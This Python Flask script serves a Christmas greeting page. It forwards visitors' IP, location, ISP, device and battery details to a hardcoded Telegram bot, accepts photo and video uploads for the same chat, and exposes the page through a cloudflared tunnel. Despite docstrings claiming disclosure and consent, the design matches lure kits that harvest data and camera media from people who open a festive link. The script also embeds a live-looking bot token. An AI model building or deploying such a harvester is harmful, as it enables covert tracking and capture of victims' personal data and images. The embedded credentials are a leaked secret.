#!/usr/bin/env python3
"""MERRY CHRISTMAS - Flask app with Telegram notifications.

Features:
- Christmas landing page (tree, lights, snow, Jingle Bells, wishes)
- Visitor info notification to Telegram on page open (disclosed)
- Consent-gated photo and video uploads to Telegram
"""

import base64
import os
import time
import threading

import requests
from flask import Flask, jsonify, request, send_from_directory

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)

app = Flask(__name__)

# ---------------- BANNER ----------------

BANNER = r"""
      .:.   MERRY CHRISTMAS   .:.
   .:;;;;:;  ================  :;;;;;;:.
  ,;;;;;;;';  Flask + Telegram  ,;;;;;;;',
 ;;;;;;;;;;;   Visitor notifier   ;;;;;;;;;;;
 ';;;;;;;;;;    and consent-based    ;;;;;;;;;;'
   ';;;;;;;;'      uploads.       ';;;;;;;;'
     ';;;;;'  Ho ho ho, let's go!  ';;;;;'
"""
print(BANNER)

# ---------------- CONFIG ----------------

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8977141674:AAE-ZXs42ljH2-qKdZZJPAJgG-43AnhJqfU")
CHAT_ID = os.environ.get("CHAT_ID", "8558301309")
TG_BASE = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org")
TG_TIMEOUT = int(os.environ.get("TG_TIMEOUT", "15"))


def notify(text):
    """Send a text message to Telegram."""
    if not BOT_TOKEN or not CHAT_ID:
        print("[!] BOT_TOKEN / CHAT_ID not set - message not sent")
        return False
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    try:
        r = requests.post(url, data=data, timeout=TG_TIMEOUT)
        ok = r.status_code == 200 and r.json().get("ok")
        print(f"[{'+' if ok else '!'}] sendMessage -> {r.status_code}")
        return ok
    except Exception as e:
        print(f"[!] sendMessage error: {e}")
        return False


def send_photo(path, caption):
    """Send a photo file to Telegram."""
    if not BOT_TOKEN or not CHAT_ID:
        print("[!] BOT_TOKEN / CHAT_ID not set - photo not sent")
        return False
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendPhoto"
    try:
        with open(path, "rb") as f:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"photo": f},
                timeout=TG_TIMEOUT,
            )
        ok = r.status_code == 200 and r.json().get("ok")
        print(f"[{'+' if ok else '!'}] sendPhoto -> {r.status_code}")
        return ok
    except Exception as e:
        print(f"[!] sendPhoto error: {e}")
        return False


def send_video(path, caption):
    """Send a video file to Telegram (bot API limit: 50 MB)."""
    if not BOT_TOKEN or not CHAT_ID:
        print("[!] BOT_TOKEN / CHAT_ID not set - video not sent")
        return False
    url = f"{TG_BASE}/bot{BOT_TOKEN}/sendVideo"
    try:
        with open(path, "rb") as f:
            r = requests.post(
                url,
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"video": f},
                timeout=TG_TIMEOUT,
            )
        ok = r.status_code == 200 and r.json().get("ok")
        print(f"[{'+' if ok else '!'}] sendVideo -> {r.status_code}")
        return ok
    except Exception as e:
        print(f"[!] sendVideo error: {e}")
        return False


def format_visitor_info(data):
    """Build the MERRY CHRISTMAS visitor info text."""
    def g(key, default="Unknown"):
        v = data.get(key)
        return v if v not in (None, "", "undefined") else default

    battery = g("battery", None)
    if battery is not None and str(battery) not in ("Unknown", "null"):
        charging = g("charging", "")
        battery_txt = f"{battery}%" + (" (charging)" if charging in (True, "true") else "")
    else:
        battery_txt = "Not available"

    memory = g("memory", "Unknown")
    memory_txt = "Unknown" if str(memory) in ("Unknown", "null", "undefined") else f"{memory} GB"

    location = ", ".join(
        x for x in [g("city", ""), g("region", ""), g("country", "")] if x
    ) or "Unknown"

    mobile = g("mobile", False)
    mobile_txt = "Yes" if mobile in (True, "true", "Yes") else "No (desktop)"

    lines = [
        "MERRY CHRISTMAS - Visitor Info",
        "--------------------",
        f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"From: {g('referrer', 'direct / no referrer')}",
        "",
        f"IP: {g('ip')}",
        f"Location: {location}",
        f"ISP: {g('isp')}",
        f"Timezone: {g('timezone')}",
        "",
        f"Mobile: {mobile_txt}",
        f"Screen: {g('screen')}",
        f"Viewport: {g('viewport')}",
        f"RAM: {memory_txt}",
        f"Battery: {battery_txt}",
        f"Language: {g('language')}",
        f"User agent: {g('browser')}",
    ]
    return "\n".join(lines)


# ---------------- ROUTES ----------------

@app.route("/")
def index():
    return send_from_directory(os.path.join(BASE_DIR, "templates"), "index.html")


@app.route("/api/send", methods=["POST"])
def api_send():
    """Receive visitor info and forward it to Telegram."""
    data = request.get_json(silent=True) or {}
    notify(format_visitor_info(data))
    return jsonify({"status": "ok"})


@app.route("/upload/image", methods=["POST"])
def upload_image():
    """Photo upload - requires the consent flag."""
    data = request.get_json(silent=True) or {}
    if not data.get("consent"):
        return jsonify({"status": "rejected", "reason": "no-consent"}), 400
    if not data.get("original"):
        return jsonify({"status": "error", "reason": "no-data"}), 400
    try:
        img = base64.b64decode(data["original"].split(",")[1])
    except Exception:
        return jsonify({"status": "error", "reason": "bad-data"}), 400
    path = os.path.join(UPLOAD_DIR, f"img_{int(time.time() * 1000)}.png")
    with open(path, "wb") as f:
        f.write(img)
    send_photo(path, "Photo upload (user consented)")
    return jsonify({"status": "ok"})


@app.route("/upload/video", methods=["POST"])
def upload_video():
    """Video upload - requires the consent flag."""
    if request.form.get("consent") != "true":
        return jsonify({"status": "rejected", "reason": "no-consent"}), 400
    f = request.files.get("original")
    if not f or not f.filename:
        return jsonify({"status": "error", "reason": "no-file"}), 400
    path = os.path.join(UPLOAD_DIR, f"vid_{int(time.time() * 1000)}.mp4")
    f.save(path)
    send_video(path, "Video upload (user consented)")
    return jsonify({"status": "ok"})


# ---------------- MAIN ----------------

def start_tunnel():
    """Start a cloudflared tunnel in the background (optional)."""
    try:
        os.system("cloudflared tunnel --url http://127.0.0.1:5000 > tunnel.log 2>&1 &")
        print("[*] Cloudflared tunnel starting (see tunnel.log)")
    except Exception as e:
        print(f"[!] Tunnel error: {e}")


def main():
    global BOT_TOKEN, CHAT_ID
    if not BOT_TOKEN:
        BOT_TOKEN = input("Bot token: ").strip()
    if not CHAT_ID:
        CHAT_ID = input("Chat ID: ").strip()
    if os.environ.get("NO_TUNNEL") != "1":
        threading.Thread(target=start_tunnel, daemon=True).start()
    port = int(os.environ.get("PORT", "5000"))
    print(f"[*] MERRY CHRISTMAS running on http://127.0.0.1:{port}")
    app.run(host="0.0.0.0", port=port, debug=False)


if __name__ == "__main__":
    main()
